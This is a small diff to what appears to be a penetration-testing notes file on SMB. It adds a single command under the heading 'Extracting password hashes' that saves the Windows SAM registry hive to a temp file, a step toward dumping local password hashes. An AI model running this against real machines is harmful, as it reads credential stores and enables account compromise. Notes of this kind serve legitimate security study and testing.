@@ -21,6 +21,9 @@ The SMB protocol will allow your team members to use these shared files as if th
 
 #### Extracting password hashes
 
+```
+reg save hklm\sam %tmp%/sam.reg
+```
 
 
 #### Priviledge Escallation Using Psexec 
